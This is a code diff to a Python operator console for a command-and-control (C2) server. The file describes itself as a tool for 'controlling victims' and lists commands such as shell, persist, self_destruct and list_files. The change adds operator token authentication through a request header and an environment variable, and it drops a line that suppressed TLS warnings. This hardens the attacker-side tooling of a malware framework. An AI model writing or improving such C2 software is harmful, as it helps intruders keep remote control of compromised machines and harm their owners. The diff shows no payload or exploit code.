@@ -5,10 +5,9 @@ Command-line interface for controlling victims via C2 server.
 
 import argparse
 import json
+import os
 import sys
 import requests
-
-requests.packages.urllib3.disable_warnings()
 
 
 class OperatorCLI:
@@ -18,9 +17,11 @@ class OperatorCLI:
         "system_info", "persist", "self_destruct", "shell", "list_files"
     ]
 
-    def __init__(self, c2_url):
+    def __init__(self, c2_url, token=None):
         self.c2_url = c2_url.rstrip("/")
         self.session = requests.Session()
+        if token:
+            self.session.headers.update({"X-Operator-Token": token})
         self.current_victim = None
 
     def banner(self):
@@ -146,8 +147,20 @@ class OperatorCLI:
 def main():
     parser = argparse.ArgumentParser(description="CyberRecon Operator CLI")
     parser.add_argument("--c2", default="http://127.0.0.1:8443", help="C2 server URL")
+    parser.add_argument(
+        "--token",
+        default=os.getenv("CYBERRECON_OPERATOR_TOKEN", ""),
+        help="Operator API token (or set CYBERRECON_OPERATOR_TOKEN env var)",
+    )
     args = parser.parse_args()
-    cli = OperatorCLI(args.c2)
+
+    if not args.token:
+        print("[!] WARNING: No operator token provided.")
+        print("    Set --token <TOKEN> or CYBERRECON_OPERATOR_TOKEN env var.")
+        print("    Protected endpoints will return 401.")
+        print()
+
+    cli = OperatorCLI(args.c2, args.token)
     cli.interactive()
 
 
